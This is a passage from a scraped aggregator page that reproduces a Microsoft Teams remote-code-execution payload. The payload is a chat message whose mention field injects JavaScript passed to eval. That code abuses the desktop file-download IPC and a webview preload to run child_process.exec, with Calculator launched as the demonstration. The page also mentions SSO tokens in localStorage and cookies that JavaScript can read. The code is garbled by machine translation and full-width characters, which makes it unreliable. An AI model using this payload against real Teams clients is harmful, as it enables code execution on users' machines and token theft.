n＆lt; div＆gt;＆lt; span itemscope itemtype = \＆＃34; http：//schema.skype.com/Mention \＆＃34; itemid = \＆＃34; 0 \＆＃34;＆gt; dada＆lt; / span＆gt; // div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; \ n＆lt; / div＆gt; n＆lt; / div＆gt;＆＃34;，＆＃34;消息类型＆＃34;：＆＃34; RichText / Html＆＃34;，＆＃34;内容类型＆＃34;：＆＃34;文本＆＃34;，＆＃ 34; amsreferences＆＃34;：[]，＆＃34; clientmessageid＆＃34;：＆＃34; 9868848366534370000＆＃34;，＆＃34; imdisplayname＆＃34;：＆＃34; Oskars Vegeris＆＃34;，＆＃34 ; properties＆＃34;：{＆＃34; importance＆＃34;：＆＃34;＆＃34;，＆＃34; subject＆＃34;：null，＆＃34;提及＆＃34; ::＆＃34; [ {\＆＃34; @type \＆＃34;：\＆＃34; http：//schema.skype.com/Mention \＆＃34;，\＆＃34; itemid \＆＃34;：0， \＆＃34; tagId \＆＃34;：\＆＃34; tHab2TLzpa \＆＃34;，\＆＃34; mri \＆＃34;：\＆＃34; tHab2TLzpa \＆＃34;，\＆ ＃34; mentionType \＆＃34;：\＆＃34; tag \＆＃34;，\＆＃34; displayName \＆＃34;：\＆＃34; x标记该点{{[[＆＃39; if（typeof saytime ==`undefined`）{mentiontime = 1; stage1 =`data：text / plain，cp = require（\\\＆＃34; child_process \\\\＆＃34;）; cp.exec（\ \\＆＃34;打开/System/Applications/Calculator.app\\\&#34;)`;this.electronSafeIpc.send(`desktopFileDownload`,stage1);this.electronSafeIpc.on(`desktop-file-download完成`， （_，fileinfo）=＆gt; {f = fileinfo.uniqueFile.filePath; stage2 =`data：text / html，＆lt; webview src = \\\＆＃34; about：blank \\\＆＃34; preload = \\\＆＃34; file：/// $ {f} \\\＆＃34;＆gt;＆lt; / webview＆gt;`; this.electronSafeIpc.send（`allowWindowOpenUrl`，stage2）; this.w = window.open（stage2）; setTimeout（（）=＆gt; {this.w.close（）}，2000）}）}＆＃39;]。forEach（$ root。$$ childHead。$$ nextSibling.app 。$ window.eval）} \ u0000} \＆＃34;}]＆＃34;}}</p><p>       list of SSO token identifiers in localStorage &amp;&amp; cookie parameters available from JavaScript in Microsoft Teams</p><p>       localStorage＆amp;＆amp;中的SSO令牌标识符列表可从Microsoft Teams中的JavaScript获得cookie参数 </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/ms/">#ms</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/spoofing/">#spoofing</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/microsoft/">#microsoft</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/分享/">#分享</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>